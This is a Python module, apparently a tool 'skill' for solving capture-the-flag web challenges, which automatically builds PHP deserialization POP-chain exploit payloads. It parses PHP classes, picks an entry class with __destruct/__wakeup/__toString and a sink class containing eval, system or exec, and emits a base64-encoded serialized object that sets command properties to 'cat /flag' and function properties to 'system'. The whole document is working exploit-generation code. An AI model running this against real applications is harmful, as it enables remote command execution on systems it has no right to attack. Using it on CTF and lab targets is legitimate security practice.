"""PHP 反序列化 POP 链利用 Skill：解析源码自动构造 POP 链 payload。

适用场景：Web 题存在 PHP unserialize() 调用，源码中有可利用的
__destruct/__wakeup/__toString 魔术方法。
输入：php_source (源码字符串) 或 file_path (源码文件路径)
输出：构造好的序列化 payload + base64 编码
"""
import base64
import re
import os

try:
    import httpx
except ImportError:
    httpx = None


def _extract_classes(source: str) -> list[dict]:
    """从 PHP 源码中提取类定义和魔术方法。"""
    classes = []
    class_pattern = re.compile(r'class\s+(\w+)(?:\s+extends\s+(\w+))?\s*\{', re.I)
    for m in class_pattern.finditer(source):
        name = m.group(1)
        parent = m.group(2) or ""
        start = m.end()
        depth = 1
        pos = start
        while pos < len(source) and depth > 0:
            if source[pos] == '{':
                depth += 1
            elif source[pos] == '}':
                depth -= 1
            pos += 1
        body = source[start:pos - 1] if depth == 0 else source[start:]

        props = re.findall(r'(?:public|protected|private)\s+(\$\w+)\s*=\s*([^;]+);', body)
        magics = re.findall(r'function\s+(__\w+)\s*\(([^)]*)\)', body)

        classes.append({
            "name": name,
            "parent": parent,
            "properties": props,
            "magic_methods": magics,
            "body": body,
        })
    return classes


def _serialize_object(class_name: str, props: dict) -> str:
    """手动构造 PHP 序列化字符串。"""
    items = []
    for k, v in props.items():
        k_clean = k.lstrip('$')
        if isinstance(v, str) and v.startswith("O:"):
            items.append(f'{len(k_clean)}:"{k_clean}";{v}')
        elif isinstance(v, str) and v.lstrip('-').isdigit():
            items.append(f'{len(k_clean)}:"{k_clean}";i:{v};')
        else:
            items.append(f'{len(k_clean)}:"{k_clean}";s:{len(v)}:"{v}";')
    prop_str = "".join(items)
    return f'O:{len(class_name)}:"{class_name}":{len(props)}:{{{prop_str}}}'


def _build_pop_chain(classes: list[dict]) -> str | None:
    """尝试自动构造 POP 链。"""
    if not classes:
        return None

    entry = None
    for c in classes:
        for mm in c["magic_methods"]:
            if mm[0] in ("__destruct", "__wakeup", "__toString"):
                entry = c
                break
        if entry:
            break
    if not entry:
        entry = classes[0]

    sink_keywords = ["eval", "system", "exec", "passthru", "file_put_contents",
                     "include", "require", "assert", "shell_exec", "popen"]
    sink = None
    for c in classes:
        for kw in sink_keywords:
            if kw in c["body"].lower():
                sink = c
                break
        if sink:
            break
    if not sink:
        return None

    # 构造 sink 对象
    sink_props = {}
    for pname, pval in sink["properties"]:
        pname_lower = pname.lower()
        if any(k in pname_lower for k in ["cmd", "command", "file", "code", "data"]):
            sink_props[pname] = "cat /flag"
        elif any(k in pname_lower for k in ["exec", "eval", "func"]):
            sink_props[pname] = "system"
        else:
            sink_props[pname] = pval.strip().strip("'\"")

    sink_obj = _serialize_object(sink["name"], sink_props)

    if entry["name"] != sink["name"]:
        entry_props = {}
        for pname, pval in entry["properties"]:
            entry_props[pname] = sink_obj
        entry_obj = _serialize_object(entry["name"], entry_props)
        return entry_obj
    return sink_obj


def run(php_source: str = "", file_path: str = "", **kwargs) -> dict:
    results = {"flag": "", "evidence": "", "payload": "", "payload_b64": ""}

    source = php_source or kwargs.get("source", "")
    if file_path and not source:
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                source = f.read()

    if not source:
        results["evidence"] = "缺少 PHP 源码"
        return results

    classes = _extract_classes(source)
    if not classes:
        results["evidence"] = "未找到类定义"
        return results

    results["evidence"] = f"发现 {len(classes)} 个类: {[c['name'] for c in classes]}"

    payload = _build_pop_chain(classes)
    if payload:
        results["payload"] = payload
        results["payload_b64"] = base64.b64encode(payload.encode()).decode()
        results["evidence"] += "\nPOP 链构造成功，base64 payload 已生成"
    else:
        results["evidence"] += "\n无法自动构造 POP 链，需人工分析"

    return results
